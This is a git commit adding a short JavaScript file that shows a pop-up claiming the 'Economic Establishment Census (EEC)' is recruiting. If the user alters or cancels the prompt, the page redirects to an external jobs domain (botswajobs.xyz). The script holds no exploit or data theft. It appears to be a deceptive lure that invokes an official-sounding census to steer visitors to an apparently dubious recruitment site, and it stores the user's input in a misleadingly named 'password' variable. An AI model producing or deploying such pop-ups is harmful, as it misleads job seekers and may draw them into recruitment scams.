80587b17c93bd06260eee7915188339db2b3c66e
newetijazz2 <newetijazz2@gmail.com>
2025-08-09 09:50:48 +0100

    Create zmcensus.js

---
+++ zmcensus.js
@@ -0,0 +1,6 @@
+
+var password = 'EEC Recruitment'
+password=prompt('NOTICE: Economic Establishment Census (EEC) is Currently recruiting, press OK to apply for the','EEC Recruitment');
+if (password != 'EEC Recruitment') {
+location.href='https://www.botswajobs.xyz/Zam-EEC-2025';
+}
